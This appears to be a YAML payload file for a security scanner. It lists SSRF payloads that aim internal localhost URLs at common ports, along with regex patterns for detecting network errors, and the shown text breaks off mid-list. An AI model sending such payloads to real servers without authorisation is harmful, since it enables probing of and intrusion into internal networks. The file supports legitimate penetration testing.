metadata:
  type: ssrf/internal
  version: "1.0"
  description: "Internal network SSRF payloads"
  sources: ["OWASP", "PayloadsAllTheThings", "HackTricks"]

detection_patterns:
  - "(?i)connection.*?refused"
  - "(?i)no route to host"
  - "(?i)connection timed out"
  - "(?i)network is unreachable"

payloads:
  localhost:
    - value: "http://127.0.0.1/"
      description: "Standard localhost"
      severity: high
      tags: [localhost, ipv4]

    - value: "http://127.0.0.1:80/"
      description: "Localhost port 80"
      severity: high
      tags: [localhost, ipv4]

    - value: "http://127.0.0.1:443/"
      description: "Localhost port 443"
      severity: high
      tags: [localhost, ipv4]

    - value: "http://127.0.0.1:8080/"
      description: "Localhost port 8080"
      severity: high
      tags: [localhost, ipv4]

    - value: "http://127.0.0.1:8443/"
      description: "Localhost port 8443"
      severity: high
      tags: [localhost, ipv4]

    - value: "http://127.0.0.1:3000/"
      description: "Localhost port 3000"
      severity: high
      tags: [localhost, ipv4]

    - value: "http://127.0.0.1:5000/"
